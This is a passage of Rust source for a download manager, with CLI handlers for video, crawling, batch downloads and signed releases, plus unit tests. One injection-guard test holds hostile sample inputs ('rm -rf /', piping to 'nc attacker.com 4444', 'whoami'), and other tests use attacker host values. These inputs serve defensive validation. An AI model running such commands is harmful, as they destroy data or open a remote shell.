                        "📁 تم حفظ الملف في: {:?} | SHA-256: {:?}",
                        m.final_file_path(),
                        m.computed_sha256
                    );
                    break;
                } else if m.status == DownloadStatus::Failed
                    || m.status == DownloadStatus::NeedsUrlRefresh
                {
                    pb.abandon_with_message("❌ توقف التحميل");
                    println!("السبب: {:?}", m.last_error);
                    break;
                }
            }
        }
        Commands::Video { url, output } => {
            let client = Client::new();
            if url.contains(".m3u8") {
                let engine = MediaStreamEngine::new(client);
                let saved = engine
                    .download_hls_stream(&url, &output, &HeaderMap::new(), 8)
                    .await?;
                println!("🎬 اكتمل تحميل وفك تشفير بث HLS بنجاح: {:?}", saved);
            } else {
                let parent = output.parent().unwrap_or_else(|| Path::new("."));
                let cancel_flag = Arc::new(AtomicBool::new(false));
                MediaStreamEngine::download_via_ytdlp_cancellable(&url, parent, None, cancel_flag)
                    .await?;
                println!("🎬 اكتمل تحميل الفيديو عبر جسر yt-dlp في: {:?}", parent);
            }
        }
        Commands::Grab {
            url,
            filter,
            max_depth,
            max_pages,
        } => {
            let client = Client::new();
            let crawler = BoundedSiteCrawler::new(client);
            let exts: Vec<String> = filter
                .split(',')
                .map(|s| s.trim().to_string())
                .filter(|s| !s.is_empty())
                .collect();
            let cfg = CrawlConfig {
                start_url: url,
                max_depth,
                max_pages,
                allowed_extensions: exts,
                ..Default::default()
            };
            let report = crawler.crawl(&cfg).await?;
            println!(
                "🔍 اكتمل الزحف المحدود (تم فحص {} صفحات، واكتشاف {} ملفات مطابقة):",
                report.pages_visited,
                report.matched_files.len()
            );
            for (i, link) in report.matched_files.iter().enumerate() {
                println!("  {}. {}", i + 1, link);
            }
        }
        Commands::Batch {
            pattern,
            step,
            output_dir,
        } => {
            let urls = WildcardPatternExpander::expand_pattern(&pattern, step)?;
            println!("📦 تم توسيع النمط الدفعي إلى {} رابط صالح:", urls.len());
            let output_dir = if output_dir == PathBuf::from("./Downloads") {
                default_download_directory()
            } else {
                output_dir
            };
            let state = AppState::new(output_dir, 8, 0);
            for (idx, u) in urls.into_iter().enumerate() {
                println!("  [{}] جدولة الرابط: {}", idx + 1, u);
                let _ = state
                    .enqueue_download(InterceptDownloadPayload {
                        url: u,
                        queue_name: Some("main".to_string()),
                        ..Default::default()
                    })
                    .await;
            }
        }
        Commands::ZipPreview { url } => {
            let client = Client::new();
            let preview =
                RemoteZipInspector::inspect_remote_zip(&client, &url, &HeaderMap::new()).await?;
            println!(
                "🗜️ معاينة أرشيف ZIP عن بُعد ({} ملفات، الحجم الكلي للأرشيف: {} بايت):",
                preview.total_entries, preview.archive_total_size
            );
            for entry in &preview.entries {
                println!(
                    "  - {} (مضغوط: {} B | أصلي: {} B | CRC32: {})",
                    entry.filename,
                    entry.compressed_size,
                    entry.uncompressed_size,
                    entry.crc32_hex
                );
            }
        }
        Commands::Tools { update } => {
            let dir = default_download_directory();
            let report = if update {
                println!("🔄 جاري فحص وتثبيت/تحديث أداتي yt-dlp و FFmpeg من GitHub Releases...");
                update_all_tools(Client::new(), dir, true).await
            } else {
                get_tools_status(&dir)
            };
            println!("🧰 حالة الأدوات المساعدة:");
            println!(
                "  - yt-dlp: {} ({:?})",
                if report.ytdlp_installed {
                    "مثبت ✓"
                } else {
                    "غير مثبت"
                },
                report.ytdlp_path
            );
            println!(
                "  - FFmpeg: {} ({:?})",
                if report.ffmpeg_installed {
                    "مثبت ✓"
                } else {
                    "غير مثبت"
                },
                report.ffmpeg_path
            );
            println!("  - مجلد الأدوات: {}", report.tools_directory);
        }
        Commands::Verify => {
            run_independent_self_verification().await?;
        }
        Commands::SignRelease {
            version,
            url,
            installer,
            notes,
            output,
            key_file,
            generate_key_out,
        } => {
            use ring::signature::{Ed25519KeyPair, KeyPair};
            let _ = notes;
            let (sha256_hex, _md5, _crc32) = compute_file_all_digests(&installer).await?;

            // الأمان: قراءة البذرة الخاصة حصرياً من متغير البيئة STORMGET_SIGNING_SEED_HEX أو من ملف مفتاح محمي،
            // وعدم قبولها عبر معاملات سطر الأوامر أو طباعتها على الشاشة لمنع تسربها إلى سجلات CI أو قائمة العمليات.
            let seed_hex_raw = std::env::var("STORMGET_SIGNING_SEED_HEX")
                .ok()
                .map(|v| v.trim().to_string())
                .filter(|v| !v.is_empty());

            let key_file_path = key_file.or_else(|| {
                std::env::var("STORMGET_SIGNING_KEY_FILE")
                    .ok()
                    .filter(|s| !s.trim().is_empty())
                    .map(PathBuf::from)
            });

            let mut seed_bytes: [u8; 32] = if let Some(mut hex_str) = seed_hex_raw {
                let raw = hex::decode(hex_str.trim())
                    .map_err(|e| anyhow::anyhow!("بذرة STORMGET_SIGNING_SEED_HEX غير صالحة: {e}"))?;
                // مسح النص السداسي من الذاكرة
                unsafe {
                    for b in hex_str.as_bytes_mut() {
                        std::ptr::write_volatile(b, 0);
                    }
                }
                raw.try_into().map_err(|_| {
                    anyhow::anyhow!("يجب أن يكون طول بذرة Ed25519 بالضبط 32 بايت (64 حرفاً سداسياً عشرياً)")
                })?
            } else if let Some(ref kf) = key_file_path {
                let mut content = tokio::fs::read_to_string(kf)
                    .await
                    .map_err(|e| anyhow::anyhow!("تعذر قراءة ملف المفتاح الخاص {:?}: {e}", kf))?;
                let raw = hex::decode(content.trim())
                    .map_err(|e| anyhow::anyhow!("محتوى ملف المفتاح الخاص غير صالح: {e}"))?;
                unsafe {
                    for b in content.as_bytes_mut() {
                        std::ptr::write_volatile(b, 0);
                    }
                }
                raw.try_into().map_err(|_| {
                    anyhow::anyhow!("يجب أن يحتوي ملف المفتاح الخاص على 32 بايت (64 حرفاً سداسياً عشرياً)")
                })?
            } else if let Some(ref gen_path) = generate_key_out {
                let mut rnd = [0u8; 32];
                use ring::rand::{SecureRandom, SystemRandom};
                SystemRandom::new()
                    .fill(&mut rnd)
                    .map_err(|_| anyhow::anyhow!("تعذر توليد بذرة عشوائية آمنة لمفتاح Ed25519"))?;
                if let Some(parent) = gen_path.parent() {
                    if !parent.as_os_str().is_empty() {
                        let _ = tokio::fs::create_dir_all(parent).await;
                    }
                }
                tokio::fs::write(gen_path, hex::encode(rnd)).await?;
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let _ = std::fs::set_permissions(gen_path, std::fs::Permissions::from_mode(0o600));
                }
                println!("🔒 تم توليد مفتاح خاص جديد وحفظه بأمان في الملف: {} (لم يُطبع على الشاشة لحمايته)", gen_path.display());
                rnd
            } else {
                anyhow::bail!(
                    "لم يتم توفير مفتاح التوقيع الخاص. يرجى تمريره عبر متغير البيئة STORMGET_SIGNING_SEED_HEX أو عبر --key-file <PATH> (أو استخدم --generate-key-out <PATH> لتوليد مفتاح جديد في ملف محمي)."
                );
            };

            let kp_res = Ed25519KeyPair::from_seed_unchecked(&seed_bytes);
            // SAFETY: Zeroize the stack-allocated 32-byte private key seed immediately after constructing the keypair.
            unsafe {
                for b in &mut seed_bytes {
                    std::ptr::write_volatile(b, 0);
                }
            }
            let kp = kp_res.map_err(|_| anyhow::anyhow!("فشل بناء زوج مفاتيح Ed25519"))?;
            let pub_hex = hex::encode(kp.public_key().as_ref());
            let canonical_msg = signed_message(&version, &sha256_hex);
            let sig = kp.sign(canonical_msg.as_bytes());
            let sig_hex = hex::encode(sig.as_ref());

            let manifest = SignedReleaseManifest {
                version: version.clone(),
                url: url.clone(),
                sha256: sha256_hex.clone(),
                sig: sig_hex,
            };
            if !signature_ok(&manifest, &pub_hex) {
                anyhow::bail!("فشل التحقق الذاتي من التوقيع الرقمي المتولد (Ed25519)");
            }

            let out_parent = output
                .parent()
                .filter(|p| !p.as_os_str().is_empty())
                .unwrap_or_else(|| Path::new("."));
            let _ = tokio::fs::create_dir_all(out_parent).await;

            let json_pretty = serde_json::to_string_pretty(&manifest)?;
            tokio::fs::write(&output, json_pretty).await?;

            // توليد ملفي SHA256SUMS و SHA2-256SUMS في نفس مجلد الإخراج لدعم التحقق التلقائي لبصمة الناشر والتحديثات
            let installer_filename = installer
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or(SETUP_FILENAME);
            let sums_line = format!("{sha256_hex}  {installer_filename}
");
            let _ = tokio::fs::write(out_parent.join("SHA256SUMS"), &sums_line).await;
            let _ = tokio::fs::write(out_parent.join("SHA2-256SUMS"), &sums_line).await;

            println!("✅ تم توقيع الإصدار v{version} وحفظ version.json و SHA256SUMS في: {}", out_parent.display());
            println!("📌 المفتاح العام (STORMGET_UPDATE_PUBKEY_HEX): {pub_hex}");
            println!("📌 البصمة الرقمية للمثبت (SHA-256): {sha256_hex}");
        }
    }

    Ok(())
}

// ============================================================================
// 3. اختبارات الوحدات والتكامل القياسية والعدائية (22 Unit & Adversarial Tests)
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::NaiveDateTime;
    use reqwest::header::CONTENT_DISPOSITION;

    #[test]
    fn test_daily_and_one_time_queue_schedules() {
        let daily = QueueSchedule {
            mode: ScheduleMode::Daily,
            start_time: Some("22:00".to_string()),
            stop_time: Some("06:00".to_string()),
            start_at: None,
            ..Default::default()
        };
        assert_eq!(
            scheduled_queue_should_run(
                &daily,
                NaiveDateTime::parse_from_str("2026-10-23 23:00", "%Y-%m-%d %H:%M").expect("verified in test")
            )
            .expect("verified in test"),
            Some(true)
        );
        assert_eq!(
            scheduled_queue_should_run(
                &daily,
                NaiveDateTime::parse_from_str("2026-10-23 12:00", "%Y-%m-%d %H:%M").expect("verified in test")
            )
            .expect("verified in test"),
            Some(false)
        );

        let once = QueueSchedule {
            mode: ScheduleMode::Once,
            start_time: None,
            stop_time: None,
            start_at: Some("2026-10-23 12:00".to_string()),
            ..Default::default()
        };
        assert_eq!(
            scheduled_queue_should_run(
                &once,
                NaiveDateTime::parse_from_str("2026-10-23 11:59", "%Y-%m-%d %H:%M").expect("verified in test")
            )
            .expect("verified in test"),
            Some(false)
        );
        assert_eq!(
            scheduled_queue_should_run(
                &once,
                NaiveDateTime::parse_from_str("2026-10-23 12:00", "%Y-%m-%d %H:%M").expect("verified in test")
            )
            .expect("verified in test"),
            Some(true)
        );
    }

    #[tokio::test]
    async fn test_full_verification_suite() {
        run_independent_self_verification()
            .await
            .expect("فشل اختبار التحقق الهندسي الشامل");
    }

    #[test]
    fn test_local_ipc_cors_and_origin_security_guard() {
        let mut h = AxumHeaderMap::new();
        h.insert("x-rustidm", HeaderValue::from_static("1"));
        assert!(!is_authorized_ipc_request(&Method::OPTIONS, &h));

        let empty = AxumHeaderMap::new();
        assert!(!is_authorized_ipc_request(&Method::GET, &empty));

        let mut web_origin = AxumHeaderMap::new();
        web_origin.insert("origin", HeaderValue::from_static("https://attacker.com"));
        web_origin.insert("x-rustidm", HeaderValue::from_static("1"));
        assert!(!is_authorized_ipc_request(&Method::POST, &web_origin));

        let mut chrome_ext = AxumHeaderMap::new();
        chrome_ext.insert(
            "origin",
            HeaderValue::from_static("chrome-extension://abcdefghijklmnop"),
        );
        chrome_ext.insert("x-rustidm", HeaderValue::from_static("1"));
        assert!(is_authorized_ipc_request(&Method::POST, &chrome_ext));

        // التحقق من عزل المسارات الحساسة عن إضافات المتصفح
        assert!(!is_authorized_ipc_request_for_path(
            &Method::POST,
            "/api/v1/config",
            &chrome_ext
        ));
        assert!(!is_authorized_ipc_request_for_path(
            &Method::POST,
            "/api/v1/queues",
            &chrome_ext
        ));
        assert!(!is_authorized_ipc_request_for_path(
            &Method::DELETE,
            "/api/v1/downloads/task-1",
            &chrome_ext
        ));

        // السماح لعامل واجهة سطح المكتب المحلي (بدون Origin متصفح) بالوصول إلى /config
        let mut desktop_worker = AxumHeaderMap::new();
        desktop_worker.insert("x-rustidm", HeaderValue::from_static("1"));
        assert!(is_authorized_ipc_request_for_path(
            &Method::POST,
            "/api/v1/config",
            &desktop_worker
        ));
    }

    #[test]
    fn test_local_host_header_guard_blocks_dns_rebinding() {
        fn with_host(value: &str) -> AxumHeaderMap {
            let mut h = AxumHeaderMap::new();
            h.insert("host", HeaderValue::from_str(value).expect("verified in test"));
            h
        }

        for ok in [
            "127.0.0.1:16888",
            "127.0.0.1",
            "localhost:16888",
            "LOCALHOST:16888",
            "[::1]:16888",
            "[::1]",
        ] {
            assert!(is_allowed_local_host(&with_host(ok)), "يجب قبول Host: {ok}");
        }

        for bad in [
            "evil.com",
            "evil.com:16888",
            "127.0.0.1.evil.com:16888",
            "localhost.evil.com",
            "127.0.0.1:abc",
            "127.0.0.1:",
            "127.0.0.1:1234567",
            "[::1]x",
            "[::1",
            "",
            "0.0.0.0:16888",
            "192.168.1.5:16888",
        ] {
            assert!(!is_allowed_local_host(&with_host(bad)), "يجب رفض Host: {bad}");
        }

        // غياب ترويسة Host نهائياً يُرفض
        assert!(!is_allowed_local_host(&AxumHeaderMap::new()));
    }

    #[test]
    fn test_shell_injection_command_guard() {
        assert!(validate_safe_executable_path("C:\\Program Files\\Defender\\MpCmdRun.exe").is_ok());
        assert!(validate_safe_executable_path("cmd.exe /c calc.exe & whoami").is_err());
        assert!(validate_safe_executable_path("scanner.exe; rm -rf /").is_err());
        assert!(validate_safe_executable_path("scanner.exe | nc attacker.com 4444").is_err());
    }

    #[test]
    fn test_adversarial_206_content_range_and_empty_stream_validation() {
        // 1. غياب Content-Range في استجابة 206
        let no_cr = HeaderMap::new();
        let err1 =
            validate_partial_content_range(reqwest::StatusCode::PARTIAL_CONTENT, &no_cr, 0, 4096)
                .unwrap_err()
                .to_string();
        assert!(err1.contains("MISSING_CONTENT_RANGE"));

        // 2. Content-Length: 0 في استجابة 206
        let mut zero_cl = HeaderMap::new();
        zero_cl.insert(CONTENT_LENGTH, HeaderValue::from_static("0"));
        zero_cl.insert(
            "content-range",
            HeaderValue::from_static("bytes 0-1023/4096"),
        );
        let err2 =
            validate_partial_content_range(reqwest::StatusCode::PARTIAL_CONTENT, &zero_cl, 0, 4096)
                .unwrap_err()
                .to_string();
        assert!(err2.contains("EMPTY_RESPONSE_STREAM"));

        // 3. عدم تطابق بداية النطاق
        let mut bad_start = HeaderMap::new();
        bad_start.insert(
            "content-range",
            HeaderValue::from_static("bytes 512-1023/4096"),
        );
        let err3 = validate_partial_content_range(
            reqwest::StatusCode::PARTIAL_CONTENT,
            &bad_start,
            0,
            4096,
        )
        .unwrap_err()
        .to_string();
        assert!(err3.contains("CONTENT_RANGE_MISMATCH"));
    }

    #[test]
    fn test_ffmpeg_stream_verification_helper() {
        let valid_probe = "Stream #0:0: Video: h264 (High), yuv420p, 1920x1080\nStream #0:1: Audio: aac (LC), 44100 Hz, stereo";
        assert!(verify_probed_streams_have_video_and_audio(valid_probe));

        let video_only = "Stream #0:0: Video: h264 (High), yuv420p, 1920x1080";
        assert!(!verify_probed_streams_have_video_and_audio(video_only));
    }

    #[test]
    fn test_sparse_file_and_positional_write_at() {
        let tmp_path =
            std::env::temp_dir().join(format!("rustidm_sparse_test_{}.part", Uuid::new_v4()));
        let file = std::fs::OpenOptions::new()
            .create(true)
            .read(true)
            .write(true)
            .truncate(true)
            .open(&tmp_path)
            .expect("verified in test");
        make_sparse(&file);
        file.set_len(12).expect("verified in test");

        write_at(&file, b"WORLD!", 6).expect("verified in test");
        write_at(&file, b"HELLO ", 0).expect("verified in test");
        file.sync_all().expect("verified in test");

        let content = std::fs::read(&tmp_path).expect("verified in test");
        assert_eq!(&content, b"HELLO WORLD!");
        let _ = std::fs::remove_file(&tmp_path);
    }

    #[test]
    fn test_youtube_10mb_range_window_limit() {
        assert_eq!(
            max_request_for("https://rr5---sn-4g5ednsd.googlevideo.com/videoplayback?itag=299"),
            Some(YOUTUBE_RANGE_WINDOW_BYTES)
        );
        assert_eq!(
            max_request_for("https://googlevideo.com/videoplayback?itag=140"),
            Some(YOUTUBE_RANGE_WINDOW_BYTES)
        );
        assert_eq!(
            max_request_for("https://releases.ubuntu.com/24.04/ubuntu.iso"),
            None
        );
    }

    #[test]
    fn test_tools_ffmpeg_asset_picker_and_muxer_formats() {
        let mk = |name: &str| GhAsset {
            name: name.to_string(),
            browser_download_url: format!(
                "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/{name}"
            ),
            updated_at: "2026-10-01T00:00:00Z".to_string(),
        };
        let assets = vec![
            mk("ffmpeg-master-latest-win64-gpl.zip"),
            mk("ffmpeg-n7.0-latest-win64-gpl-7.0.zip"),
            mk("ffmpeg-n7.1-latest-win64-gpl-7.1.zip"),
            mk("ffmpeg-n7.1-latest-linux64-gpl-7.1.tar.xz"),
        ];
        assert_eq!(
            pick_ffmpeg_asset(&assets).expect("verified in test").name,
            "ffmpeg-n7.1-latest-win64-gpl-7.1.zip"
        );
        assert_eq!(muxer_format_for_filename("video_1080p.mp4"), "mp4");
        assert_eq!(muxer_format_for_filename("clip.webm"), "webm");
        assert_eq!(muxer_format_for_filename("movie.mkv"), "matroska");
    }

    #[test]
    fn test_content_range_parser_and_secret_redaction() {
        assert_eq!(
            parse_content_range_header("bytes 0-1023/4096"),
            Some((0, 1023, Some(4096)))
        );
        assert_eq!(parse_content_range_header("bytes 500-100/1000"), None);

        let mut headers = HashMap::new();
        headers.insert("Cookie".to_string(), "sid=secret123".to_string());
        headers.insert("User-Agent".to_string(), "RustIDM/2.2".to_string());
        let redacted = redact_sensitive_headers(&headers);
        assert_eq!(redacted.get("Cookie").expect("verified in test"), "[REDACTED_SECRET]");
        assert_eq!(redacted.get("User-Agent").expect("verified in test"), "RustIDM/2.2");
    }

    #[test]
    fn test_rfc5987_filename_extraction_and_percent_decoding() {
        let mut headers = HeaderMap::new();
        headers.insert(
            CONTENT_DISPOSITION,
            HeaderValue::from_static(
                "attachment; filename=\"fallback.zip\"; filename*=UTF-8''%D9%85%D9%84%D9%81_%D8%AA%D8%AC%D8%B1%D9%8A%D8%A8%D9%8A%202026.zip",
            ),
        );
        let extracted = extract_filename("https://example.com/dl?id=1", &headers);
        assert_eq!(extracted, "ملف_تجريبي 2026.zip");

        let from_url = extract_filename(
            "https://cdn.example.com/releases/Ubuntu%2024.04%20Desktop.iso",
            &HeaderMap::new(),
        );
        assert_eq!(from_url, "Ubuntu 24.04 Desktop.iso");
    }

    #[test]
    fn test_wildcard_batch_pattern_expander() {
        let numeric = WildcardPatternExpander::expand_pattern(
            "https://mirror.example.org/part_[001-005:2].rar",
            1,
        )
        .expect("verified in test");
        assert_eq!(
            numeric,
            vec![
                "https://mirror.example.org/part_001.rar",
                "https://mirror.example.org/part_003.rar",
                "https://mirror.example.org/part_005.rar",
            ]
        );

        let alpha = WildcardPatternExpander::expand_pattern(
            "https://mirror.example.org/disk_[a-c].iso",
            1,
        )
        .expect("verified in test");
        assert_eq!(
            alpha,
            vec![
                "https://mirror.example.org/disk_a.iso",
                "https://mirror.example.org/disk_b.iso",
                "https://mirror.example.org/disk_c.iso",
            ]
        );
    }

    #[test]
    fn test_remote_zip_central_directory_inspector() {
        let zip_bytes = DownloadListImporter::build_synthetic_zip_archive(&[
            ("src/main.rs", b"fn main() {}"),
            ("README.md", b"# RustIDM v2.2"),
            ("assets/logo.png", &[1, 2, 3, 4, 5, 6, 7, 8]),
        ]);
        let entries = RemoteZipInspector::parse_zip_central_directory_sync(&zip_bytes).expect("verified in test");
        assert_eq!(entries.len(), 3);
        assert_eq!(entries[0].filename, "src/main.rs");
        assert_eq!(entries[0].uncompressed_size, 12);
        assert_eq!(entries[1].filename, "README.md");
        assert_eq!(entries[2].filename, "assets/logo.png");
        assert_eq!(entries[2].uncompressed_size, 8);
    }

    #[test]
    fn test_crc32_and_md5_standard_vectors() {
        let mut crc = Crc32Hasher::new();
        crc.update(b"123456789");
        assert_eq!(format!("{:08x}", crc.finalize()), "cbf43926");

        let mut md5_empty = Md5Hasher::new();
        md5_empty.update(b"");
        assert_eq!(
            hex::encode(md5_empty.finalize()),
            "d41d8cd98f00b204e9800998ecf8427e"
        );

        let mut md5_fox = Md5Hasher::new();
        md5_fox.update(b"The quick brown fox jumps over the lazy dog");
        assert_eq!(
            hex::encode(md5_fox.finalize()),
            "9e107d9d372bb6826bd81d3542a419d6"
        );
    }

    #[test]
    fn test_ef2_and_txt_list_importer() {
        let sample_ef2 = "<\nhttps://example.com/archive.zip\nreferer: https://example.com/page\nfilename: custom.zip\nqueue: sync\n>\n";
        let parsed = DownloadListImporter::parse_import_text(sample_ef2);
        assert_eq!(parsed.len(), 1);
        assert_eq!(parsed[0].url, "https://example.com/archive.zip");
        assert_eq!(
            parsed[0].referer.as_deref(),
            Some("https://example.com/page")
        );
        assert_eq!(parsed[0].filename.as_deref(), Some("custom.zip"));
        assert_eq!(parsed[0].queue_name.as_deref(), Some("sync"));
    }

    #[test]
    fn test_mirror_failover_rotation() {
        let mut meta = DownloadStateMeta {
            task_id: "t1".to_string(),
            url: "https://primary.example.com/file.iso".to_string(),
            source_page_url: None,
            filename: "file.iso".to_string(),
            save_dir: PathBuf::from("."),
            category: FileCategory::Programs,
            total_size: 1024,
            resumable: true,
            etag: None,
            last_modified: None,
            custom_headers: HashMap::new(),
            expected_sha256: None,
            computed_sha256: None,
            status: DownloadStatus::Downloading,
            last_error: None,
            refresh_attempts: 0,
            segments: Vec::new(),
            created_at: Utc::now(),
            updated_at: Utc::now(),
            queue_name: "main".to_string(),
            mirror_urls: vec![
                "https://mirror1.example.com/file.iso".to_string(),
                "https://mirror2.example.com/file.iso".to_string(),
            ],
            active_mirror_index: 0,
            expected_md5: None,
            computed_md5: None,
            expected_crc32: None,
            computed_crc32: None,
            description: None,
            speed_history: Vec::new(),
            connection_logs: Vec::new(),
            task_speed_limit_kbps: 0,
        };
        assert_eq!(
            meta.current_effective_url(),
            "https://primary.example.com/file.iso"
        );
        assert_eq!(
            meta.rotate_mirror().as_deref(),
            Some("https://mirror1.example.com/file.iso")
        );
        assert_eq!(
            meta.rotate_mirror().as_deref(),
            Some("https://mirror2.example.com/file.iso")
        );
        assert_eq!(
            meta.rotate_mirror().as_deref(),
            Some("https://primary.example.com/file.iso")
        );
    }

    #[test]
    fn test_webvtt_to_srt_subtitle_converter() {
        let sample_vtt = "WEBVTT\n\n00:01.250 --> 00:04.500 align:start\nمرحباً بكم في RustIDM v2.2\n\n00:05.000 --> 00:08.100\nسطر الترجمة الثاني\n";
        let srt = SubtitleConverter::convert_webvtt_to_srt(sample_vtt);
        assert!(srt.contains("1\n00:00:01,250 --> 00:00:04,500\nمرحباً بكم في RustIDM v2.2"));
        assert!(srt.contains("2\n00:00:05,000 --> 00:00:08,100\nسطر الترجمة الثاني"));
    }

    #[test]
    fn test_segment_integrity_auditor_and_gap_healer() {
        let mut meta = DownloadStateMeta {
            task_id: "t_audit".to_string(),
            url: "https://example.com/data.bin".to_string(),
            source_page_url: None,
            filename: "data.bin".to_string(),
            save_dir: PathBuf::from("."),
            category: FileCategory::General,
            total_size: 1000,
            resumable: true,
            etag: None,
            last_modified: None,
            custom_headers: HashMap::new(),
            expected_sha256: None,
            computed_sha256: None,
            status: DownloadStatus::Paused,
            last_error: None,
            refresh_attempts: 0,
            segments: vec![
                FileSegment {
                    id: 0,
                    start_byte: 0,
                    current_offset: 400,
                    end_byte: 399,
                    status: SegmentStatus::Completed,
                    split_count: 1,
                    last_speed_bps: 0,
                },
                FileSegment {
                    id: 1,
                    start_byte: 600,
                    current_offset: 600,
                    end_byte: 999,
                    status: SegmentStatus::Pending,
                    split_count: 0,
                    last_speed_bps: 0,
                },
            ],
            created_at: Utc::now(),
            updated_at: Utc::now(),
            queue_name: "main".to_string(),
            mirror_urls: Vec::new(),
            active_mirror_index: 0,
            expected_md5: None,
            computed_md5: None,
            expected_crc32: None,
            computed_crc32: None,
            description: None,
            speed_history: Vec::new(),
            connection_logs: Vec::new(),
            task_speed_limit_kbps: 0,
        };

        let report_before =
            SegmentIntegrityAuditor::audit_segments(&meta.segments, meta.total_size);
        assert!(!report_before.is_contiguous);
        assert_eq!(report_before.detected_gaps, vec![(400, 599)]);

        let healed = SegmentIntegrityAuditor::heal_gaps(&mut meta);
        assert_eq!(healed, 1);

        let report_after =
            SegmentIntegrityAuditor::audit_segments(&meta.segments, meta.total_size);
        assert!(report_after.is_contiguous);
        assert_eq!(report_after.total_covered_bytes, 1000);
    }

    #[test]
    fn test_smart_routing_rule_matching() {
        let rule = SmartRoutingRule {
            rule_name: "Large Linux ISOs".to_string(),
            domain_contains: Some("ubuntu.com".to_string()),
            extension_in: vec!["iso".to_string()],
            min_size_bytes: Some(500 * 1024 * 1024),
            max_size_bytes: None,
            target_category: Some(FileCategory::Programs),
            target_queue: Some("sync".to_string()),
            target_subfolder: Some("LinuxISOs".to_string()),
        };

        assert!(rule.matches(
            "https://releases.ubuntu.com/24.04/ubuntu-24.04.iso",
            "ubuntu-24.04.iso",
            2_500_000_000
        ));
        assert!(!rule.matches(
            "https://example.com/ubuntu-24.04.iso",
            "ubuntu-24.04.iso",
            2_500_000_000
        ));
    }

    #[tokio::test]
    async fn test_zero_oom_ordered_disk_spooler() {
        let tmp_dir = std::env::temp_dir().join(format!("rustidm_spool_test_{}", Uuid::new_v4()));
        fs::create_dir_all(&tmp_dir).await.expect("verified in test");
        let output_file = tmp_dir.join("assembled_movie.mp4");
        let spool_dir = OrderedDiskSpooler::create_spool_dir(&output_file)
            .await
            .expect("verified in test");

        let out = File::create(&output_file).await.expect("verified in test");
        let (tx, rx) = mpsc::unbounded_channel();
        let merger = tokio::spawn(async move {
            OrderedDiskSpooler::run_sequential_merger(out, rx, 4).await
        });

        for &(idx, payload) in &[
            (3usize, &b"-PART3"[..]),
            (1usize, &b"-PART1"[..]),
            (0usize, &b"PART0"[..]),
            (2usize, &b"-PART2"[..]),
        ] {
            let (seg_path, seg_len) =
                OrderedDiskSpooler::write_segment_to_disk(&spool_dir, idx, payload)
                    .await
                    .expect("verified in test");
            tx.send((idx, seg_path, seg_len)).expect("verified in test");
        }
        drop(tx);

        let written = merger.await.expect("verified in test").expect("verified in test");
        let _ = fs::remove_dir_all(&spool_dir).await;
        let final_bytes = fs::read(&output_file).await.expect("verified in test");
        assert_eq!(final_bytes, b"PART0-PART1-PART2-PART3");
        assert_eq!(written as usize, final_bytes.len());
        let _ = fs::remove_dir_all(&tmp_dir).await;
    }

    #[test]
    fn test_lock_free_atomic_segment_telemetry_and_split() {
        let registry = AtomicSegmentRegistry::new();
        let mut meta = DownloadStateMeta {
            task_id: "t_lockfree".to_string(),
            url: "https://example.com/huge.iso".to_string(),
            source_page_url: None,
            filename: "huge.iso".to_string(),
            save_dir: PathBuf::from("."),
            category: FileCategory::Programs,
            total_size: 4 * 1024 * 1024,
            resumable: true,
            etag: None,
            last_modified: None,
            custom_headers: HashMap::new(),
            expected_sha256: None,
            computed_sha256: None,
            status: DownloadStatus::Downloading,
            last_error: None,
            refresh_attempts: 0,
            segments: vec![FileSegment {
                id: 0,
                start_byte: 0,
                current_offset: 0,
                end_byte: 4 * 1024 * 1024 - 1,
                status: SegmentStatus::Downloading,
                split_count: 0,
                last_speed_bps: 0,
            }],
            created_at: Utc::now(),
            updated_at: Utc::now(),
            queue_name: "main".to_string(),
            mirror_urls: Vec::new(),
            active_mirror_index: 0,
            expected_md5: None,
            computed_md5: None,
            expected_crc32: None,
            computed_crc32: None,
            description: None,
            speed_history: Vec::new(),
            connection_logs: Vec::new(),
            task_speed_limit_kbps: 0,
        };

        registry.initialize_from_meta(&meta);
        let atom0 = registry.get(0).expect("verified in test");

        atom0.current_offset.store(1024 * 1024, Ordering::Release);
        atom0.last_speed_bps.store(50_000_000, Ordering::Relaxed);

        let new_seg_id = DynamicDownloadJob::acquire_or_split_segment_with_atomics(
            &mut meta,
            512 * 1024,
            Some(&registry),
        );
        assert_eq!(new_seg_id, Some(1));
        assert_eq!(meta.segments.len(), 2);

        let expected_mid = 1024 * 1024 + (3 * 1024 * 1024 / 2) - 1;
        assert_eq!(atom0.end_byte.load(Ordering::Acquire), expected_mid);
        let atom1 = registry.get(1).expect("verified in test");
        assert_eq!(atom1.start_byte, expected_mid + 1);
        assert_eq!(
            atom1.end_byte.load(Ordering::Acquire),
            4 * 1024 * 1024 - 1
        );
    }

    #[test]
    fn test_scheduler_midnight_crossing_with_specific_weekdays() {
        // 2026-10-26 is Monday (weekday index 0), 2026-10-27 is Tuesday (weekday index 1)
        let mon_night = QueueSchedule {
            mode: ScheduleMode::Daily,
            start_time: Some("22:00".to_string()),
            stop_time: Some("06:00".to_string()),
            start_at: None,
            stop_at: None,
            days_of_week: vec![0], // Monday only
            speed_limit_kbps: 2048,
        };
        // Monday 23:30 -> active
        assert_eq!(
            scheduled_queue_should_run(
                &mon_night,
                NaiveDateTime::parse_from_str("2026-10-26 23:30", "%Y-%m-%d %H:%M").expect("verified in test")
            )
            .expect("verified in test"),
            Some(true)
        );
        // Tuesday 02:15 (carry-over from Monday night window) -> active
        assert_eq!(
            scheduled_queue_should_run(
                &mon_night,
                NaiveDateTime::parse_from_str("2026-10-27 02:15", "%Y-%m-%d %H:%M").expect("verified in test")
            )
            .expect("verified in test"),
            Some(true)
        );
        // Tuesday 23:30 (Tuesday not in days_of_week) -> inactive
        assert_eq!(
            scheduled_queue_should_run(
                &mon_night,
                NaiveDateTime::parse_from_str("2026-10-27 23:30", "%Y-%m-%d %H:%M").expect("verified in test")
            )
            .expect("verified in test"),
            Some(false)
        );
    }

    #[test]
    fn test_awesome_feature1_youtube_sabr_session_and_protobuf_potoken() {
        let ver_bytes = b"2.20261027";
        let mut client_info = vec![0x80, 0x01, 0x01, 0x8A, 0x01, ver_bytes.len() as u8];
        client_info.extend_from_slice(ver_bytes);

        let po_raw = b"secret_po_token";
        let mut streamer_ctx = vec![0x0A, client_info.len() as u8];
        streamer_ctx.extend_from_slice(&client_info);
        streamer_ctx.push(0x12);
        streamer_ctx.push(po_raw.len() as u8);
